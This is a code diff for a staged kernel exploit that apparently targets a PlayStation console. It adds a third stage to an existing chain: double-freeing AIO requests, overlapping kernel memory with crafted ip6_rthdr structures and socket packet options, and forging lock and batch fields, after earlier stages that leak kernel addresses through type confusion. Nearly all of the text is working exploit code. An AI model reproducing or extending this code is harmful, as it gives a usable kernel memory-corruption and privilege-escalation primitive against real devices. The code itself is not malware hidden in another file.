@@ -213,7 +213,7 @@ struct ip6_rthdr
 };
 
 #define NUM_ALIAS 100
-int32_t sd_pair[2] = {0};
+int32_t rthdr_sds[2] = {-1, -1};
 
 int32_t make_aliased_rthdrs()
 {
@@ -235,10 +235,9 @@ int32_t make_aliased_rthdrs()
             printf_debug("Aliased rthdrs %d & %d found at attempt: %d\n",
                 i, rthdr.ip6r_reserved, loop);
             hexdump((uint8_t*)&rthdr, 0x80);
-            sd_pair[0] = sds[i];
-            sd_pair[1] = sds[rthdr.ip6r_reserved];
-            printf_debug("sd_pair: %d %d\n",
-                sd_pair[0], sd_pair[1]);
+            rthdr_sds[0] = sds[i];
+            rthdr_sds[1] = sds[rthdr.ip6r_reserved];
+            printf_debug("rthdr_sds: %d %d\n", rthdr_sds[0], rthdr_sds[1]);
             sds[i] = -1;
             sds[rthdr.ip6r_reserved] = -1;
             free_rthdrs(sds, NUM_SDS);
@@ -455,7 +454,7 @@ int32_t double_free_reqs()
 
     SceKernelAioRWRequest reqs[NUM_REQS] = {0};
     SceKernelAioSubmitId req_ids[NUM_REQS] = {0};
-    int32_t req_errs[NUM_REQS] = {0};
+    SceKernelAioError req_errs[NUM_REQS] = {0};
 
     for (uint32_t i = 0; i < NUM_REQS; i++)
         reqs[i].fd = -1;
@@ -623,7 +622,8 @@ int32_t leak_kernel_addrs()
 {
     printf_debug("STAGE 2: Leak kernel addresses\n");
 
-    PS::close(sd_pair[1]);
+    PS::close(rthdr_sds[1]);
+    rthdr_sds[1] = -1;
 
     // Type confuse a struct evf with a struct ip6_rthdr
     printf_debug("* Confuse evf with rthdr\n");
@@ -639,14 +639,14 @@ int32_t leak_kernel_addrs()
             // `| j << 16` bitwise shenanigans will help locating evfs later
             new_evf(&evfs[j], 0x0f00 | j << 16);
 
-        get_rthdr(sd_pair[0], stage2_data.buf, &stage2_data.len);
+        get_rthdr(rthdr_sds[0], stage2_data.buf, &stage2_data.len);
         uint32_t bit_pattern = ((uint32_t*)stage2_data.buf)[0];
         if ((bit_pattern >> 16) < NUM_HANDLES)
         {
             stage2_data.evf = evfs[bit_pattern >> 16];
             // Confirm our finding
             set_evf_flags(stage2_data.evf, bit_pattern | 1);
-            get_rthdr(sd_pair[0], stage2_data.buf, &stage2_data.len);
+            get_rthdr(rthdr_sds[0], stage2_data.buf, &stage2_data.len);
             if (((uint32_t*)stage2_data.buf)[0] == (bit_pattern | 1))
                 evfs[bit_pattern >> 16] = 0;
             else
@@ -730,7 +730,7 @@ int32_t leak_kernel_addrs()
             true,
             SCE_KERNEL_AIO_CMD_WRITE
         );
-        get_rthdr(sd_pair[0], stage2_data.buf, &stage2_data.len);
+        get_rthdr(rthdr_sds[0], stage2_data.buf, &stage2_data.len);
         for (uint32_t off = 0x80; off < stage2_data.len; off += 0x80) {
             if (!verify_reqs2((aio_entry *)&stage2_data.buf[off])) continue;
             reqs2_off = off;
@@ -764,7 +764,7 @@ int32_t leak_kernel_addrs()
     for (uint32_t i = 0; i < NUM_ELEMS * NUM_HANDLES; i += NUM_ELEMS)
     {
         aio_multi_cancel(&leak_ids[i], NUM_ELEMS, aio_errs);
-        get_rthdr(sd_pair[0], stage2_data.buf, &stage2_data.len);
+        get_rthdr(rthdr_sds[0], stage2_data.buf, &stage2_data.len);
         if (stage2_data.req2->ar2_result.state != SCE_KERNEL_AIO_STATE_ABORTED)
             continue;
         printf_debug("Found target_id at batch: %d\n", i / NUM_ELEMS);
@@ -789,6 +789,257 @@ int32_t leak_kernel_addrs()
     cancel_aios(to_cancel_p, to_cancel_len);
     free_aios2(leak_ids, NUM_ELEMS * NUM_HANDLES);
 
+    return 0;
+}
+
+int32_t pktopts_sds[2] = {-1, -1};
+
+int32_t make_aliased_pktopts()
+{
+    int32_t *sds = setup_data.sds;
+    uint32_t tclass = 0;
+
+    for (uint32_t loop = 0; loop < NUM_ALIAS; loop++)
+    {
+        for (uint32_t i = 0; i < NUM_SDS; i++)
+        {
+            if (sds[i] < 0) continue; // Skip invalid sockets
+            tclass = i;
+            PS::setsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
+            // Clean-up needed !!!
+        }
+
+        for (uint32_t i = 0; i < NUM_SDS; i++)
+        {
+            if (sds[i] < 0) continue; // Skip invalid sockets
+            socklen_t len = sizeof(tclass);
+            err = PS::getsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &tclass, &len);
+            if (err) continue;
+            if (tclass == i) continue; // tclass not aliased
+            printf_debug("Aliased pktopts %d & %d found at attempt: %d\n",
+                i, tclass, loop);
+            pktopts_sds[0] = sds[i];
+            pktopts_sds[1] = sds[tclass];
+            printf_debug("pktopts_sds: %d %d\n", pktopts_sds[0], pktopts_sds[1]);
+
+            // Add pktopts to the new sockets now while new allocs can't
+            // use the double freed memory
+            sds[tclass] = create_ipv6udp();
+            sds[i] = create_ipv6udp();
+            len = sizeof(tclass);
+            PS::setsockopt(sds[tclass], IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
+            PS::setsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
+            return 0;
+        }
+
+        for (uint32_t i = 0; i < NUM_SDS; i++)
+        {
+            if (sds[i] < 0) continue; // Skip invalid sockets
+            PS::setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+        }
+    }
+    printf_debug("Failed to make aliased pktopts!\n");
+    return -1;
+}
+
+#define MAX_LEAK_LEN 0x800
+#define NUM_BATCHES 2
+#define NUM_CLOBBERS 8
+
+int32_t dirty_sd = -1;
+
+int32_t double_free_reqs1()
+{
+    printf_debug("STAGE 3: Double free SceKernelAioRWRequest\n");
+
+    uint8_t buf[0x80 * NUM_LEAKED_BLOCKS] = {0};
+
+    SceKernelAioRWRequest reqs[MAX_REQS] = {0};
+    SceKernelAioSubmitId ids[MAX_REQS * NUM_BATCHES] = {0};
+    SceKernelAioError states[MAX_REQS] = {0};
+
+    for (uint32_t i = 0; i < MAX_REQS; i++)
+        reqs[i].fd = -1;
+
+    printf_debug("* Start overwrite rthdr with AIO queue entry loop\n");
+
+    bool aio_not_found = true;
+    free_evf(stage2_data.evf);
+    for (uint32_t i = 0; i < NUM_CLOBBERS; i++)
+    {
+        spray_aio(ids, NUM_BATCHES, reqs, MAX_REQS);
+        socklen_t len = MAX_LEAK_LEN;
+        get_rthdr(rthdr_sds[0], buf, &len);
+        if (len == 8 && buf[0] == SCE_KERNEL_AIO_CMD_READ)
+        {
+            printf_debug("Aliased at attempt: %d\n", i);
+            hexdump(buf, 0x80);
+            aio_not_found = false;
+            cancel_aios(ids, MAX_REQS * NUM_BATCHES);
+            break;
+        }
+        free_aios(ids, MAX_REQS * NUM_BATCHES);
+    }
+    if (aio_not_found) {
+        printf_debug("Failed to overwrite rthdr\n");
+        return -1;
+    }
+
+    ip6_rthdr<0x80> rthdr = {0};
+    aio_entry *reqs2 = (aio_entry *)&rthdr;
+
+    reqs2->ar2_ticket = 5;
+    reqs2->ar2_info = stage2_data.reqs1;
+    // Craft a aio_batch using the end portion of the buffer
+    reqs2->ar2_batch = stage2_data.evf_p + 0x28;
+
+    // [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
+    // safe since free_queue_entry() doesn't deref the pointer
+    *((uint32_t*)&reqs2->ar2_spinfo) = 1;
+    *((uint32_t*)&reqs2->ar2_spinfo + 1) = 0;
+
+    // [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
+    *((uint32_t*)&reqs2->ar2_result.returnValue)
+        = SCE_KERNEL_AIO_STATE_COMPLETED;
+    *((uint32_t*)&reqs2->ar2_result.returnValue + 1) = 0;
+
+    // .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
+    // safe since the entry already got dequeued
+    //
+    // .ar3_lock.lock_object.lo_flags = (
+    //     LO_SLEEPABLE | LO_UPGRADABLE
+    //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
+    //     | 6 << LO_CLASSSHIFT
+    //     | LO_INITIALIZED
+    // )
+    *((uint32_t*)&reqs2->ar2_qentry) = 0x67b0000;
+
+    // .ar3_lock.lk_lock = LK_UNLOCKED
+    *((uint64_t*)&reqs2->ar2_qentry + 2) = 1; // 0x60
+
+    printf_debug("ar3:\n");
+    hexdump((uint8_t *)reqs2, 0x80);
+
+    printf_debug("* Start overwrite AIO queue entry with rthdr loop\n");
+
+    SceKernelAioSubmitId req_id = 0;
+    PS::close(rthdr_sds[0]);
+    rthdr_sds[0] = -1;
+
+    for (uint32_t i = 0; i < NUM_ALIAS; i++)
+    {
+        for (uint32_t j = 0; j < NUM_SDS; j++)
+        {
+            if (setup_data.sds[j] < 0) continue; // Skip invalid sockets
+            set_rthdr(setup_data.sds[j], &rthdr, rthdr.used_size);
+        }
+
+        for (uint32_t j = 0; j < MAX_REQS * NUM_BATCHES; j += MAX_REQS)
+        {
+            for (uint32_t k = 0; k < MAX_REQS; k++) states[k] = -1;
+            aio_multi_cancel(&ids[j], MAX_REQS, states);
+
+            int32_t req_idx = -1;
+            for (int32_t k = 0; k < MAX_REQS; k++)
+            {
+                if (states[k] != SCE_KERNEL_AIO_STATE_COMPLETED) continue;
+                req_idx = k;
+                break;
+            }
+            if (req_idx < 0) continue;
+
+            printf_debug("req_idx: %d\n", req_idx);
+            printf_debug("found req_id at batch: %d\n", j / MAX_REQS);
+            printf_debug("states: ");
+            for (uint32_t k = 0; k < MAX_REQS; k++)
+                printf_debug("%08x ", states[k]);
+            printf_debug("\n");
+            printf_debug("states[%d]: %08x\n", req_idx, states[req_idx]);
+            printf_debug("aliased at attempt: %d\n", i);
+
+            req_id = ids[j + req_idx];
+            ids[j + req_idx] = 0;
+            printf_debug("req_id: %p\n", req_id);
+
+            // set .ar3_done to 1
+            aio_multi_poll(&req_id, 1, aio_errs);
+            printf_debug("aio_multi_poll errs[0] %08x\n", aio_errs[0]);
+
+            for (uint32_t k = 0; k < NUM_SDS; k++)
+            {
+                if (setup_data.sds[k] < 0) continue; // Skip invalid sockets
+                socklen_t len = rthdr.used_size;
+                get_rthdr(setup_data.sds[k], &rthdr, &len);
+                // .ar3_done
+                if (*((uint32_t*)&reqs2->ar2_result.returnValue + 1) == 1)
+                {
+                    hexdump((uint8_t *)&rthdr, 0x80);
+                    dirty_sd = setup_data.sds[k];
+                    setup_data.sds[k] = -1;
+                    free_rthdrs(setup_data.sds, NUM_SDS);
+                    break;
+                }
+            }
+
+            if (dirty_sd < 0)
+            {
+                printf_debug("Cannot find sd that overwrote AIO queue entry!\n");
+                return -1;
+            }
+            printf_debug("dirty_sd: %d\n", dirty_sd);
+            goto loop_break;
+        }
+    }
+    loop_break:
+
+    if (!req_id)
+    {
+        printf_debug("Failed to overwrite AIO queue entry!\n");
+        return -1;
+    }
+
+    free_aios2(ids, MAX_REQS * NUM_BATCHES);
+
+    // Enable deletion of target_id
+    aio_multi_poll(&stage2_data.target_id, 1, aio_errs);
+    printf_debug("target's state: %08x\n", aio_errs[0]);
+
+    SceKernelAioError errs[2] = {-1, -1};
+    SceKernelAioSubmitId target_ids[2] = {req_id, stage2_data.target_id};
+    
+    // PANIC: double free on the 0x100 malloc zone. important kernel data may alias
+    aio_multi_delete(target_ids, 2, errs);
+
+    // We reclaim first since the sanity checking here is longer which makes it
+    // more likely that we have another process claim the memory
+
+    // RESTORE: double freed memory has been reclaimed with harmless data
+    // PANIC: 0x100 malloc zone pointers aliased
+    err = make_aliased_pktopts();
+    if (err) return err;
+
+    printf_debug("Delete errors: %08x, %08x\n", errs[0], errs[1]);
+
+    states[0] = -1;
+    states[1] = -1;
+    aio_multi_poll(target_ids, 2, states);
+    printf_debug("target states: %08x, %08x\n", states[0], states[1]);
+
+    bool success = true;
+    if (states[0] != SCE_KERNEL_ERROR_ESRCH) {
+        printf_debug("ERROR: bad delete of corrupt AIO request\n");
+        success = false;
+    }
+    if (errs[0] != 0 || errs[0] != errs[1]) {
+        printf_debug("ERROR: bad delete of ID pair\n");
+        success = false;
+    }
+
+    if (!success)
+    {
+        printf_debug("ERROR: double free on a 0x100 malloc zone failed\n");
+        return -1;
+    }
     return 0;
 }
 
@@ -819,9 +1070,8 @@ void cleanup()
     // Destroy the pthread barrier
     if (barrier != 0) scePthreadBarrierDestroy(&barrier);
 
-    // Close sd_pair[0]
-    if (sd_pair[0] > 0) PS::close(sd_pair[0]);
-
+    // Close rthdr_sds[0]
+    if (rthdr_sds[0] > 0) PS::close(rthdr_sds[0]);
 }
 
 void main()
@@ -839,14 +1089,17 @@ void main()
     // Initialize syscall wrappers
     syscall_init();
 
-    // STAGE: Setup
+    // STAGE 0: Setup
     if (setup() != 0) goto end;
 
-    // STAGE: Double free AIO queue entry
+    // STAGE 1: Double free AIO queue entry
     if (double_free_reqs() != 0) goto end;
 
-    // STAGE: Leak kernel addresses
+    // STAGE 2: Leak kernel addresses
     if (leak_kernel_addrs() != 0) goto end;
+
+    // STAGE 3: Double free SceKernelAioRWRequest
+    if (double_free_reqs1() != 0) goto end;
 
     end:
         cleanup();
